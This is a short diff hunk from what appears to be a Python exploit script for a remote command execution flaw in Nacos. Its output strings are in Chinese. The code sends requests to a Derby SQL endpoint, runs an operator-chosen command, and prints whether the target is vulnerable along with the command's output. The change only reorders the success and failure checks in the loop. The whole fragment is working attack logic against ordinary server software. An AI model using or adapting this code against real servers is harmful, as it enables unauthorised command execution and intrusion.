@@ -36,15 +36,15 @@ def exploit(target, command, service, args):
         post_json = post_resp.json()
         if args.url:
             print(post_json)
-        if (post_json['code'] == 404 or post_json['code'] == 403) or "File" not in post_json['message']:
-            print(Fore.YELLOW + f"[-] {target} 可能不存在Nacos_Rce漏洞\n" + Fore.RESET)
-            break
         if post_json.get('message', None) is None and post_json.get('data', None) is not None:
             print(post_resp.text)
             get_resp = requests.get(url=derby_url, params={'sql': get_sql}, verify=False, headers=header,
                                     timeout=5)
             print(Fore.RED + f"\n[+] {target} 存在Nacos_Rce漏洞，执行命令：{command}" + Fore.RESET)
             print(Fore.RED + f"[+] 返回的结果如下: {get_resp.text}" + Fore.RESET)
+            break
+        if (post_json['code'] == 404 or post_json['code'] == 403) or "File" not in post_json['message']:
+            print(Fore.YELLOW + f"[-] {target} 可能不存在Nacos_Rce漏洞\n" + Fore.RESET)
             break
 
 
